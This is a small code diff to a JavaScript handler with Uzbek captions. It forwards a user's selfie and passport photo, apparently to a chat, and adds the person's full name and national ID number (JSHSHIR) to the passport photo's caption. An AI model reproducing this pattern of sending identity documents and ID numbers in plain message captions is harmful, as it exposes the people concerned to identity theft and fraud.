@@ -41,7 +41,7 @@ export default async function handler(req, res) {
     if (facePhoto) await sendPhoto(facePhoto, "🤳 Yuz rasmi");
 
     // 3) Pasport rasmi
-    if (passportPhoto) await sendPhoto(passportPhoto, "📄 Hujjat");
+    if (passportPhoto) await sendPhoto(passportPhoto, `📄 Hujjat | 👤 ${record.fullName} | 🔢 ${record.jshshir}`);
 
     res.json({ ok: true });
   } catch (e) {
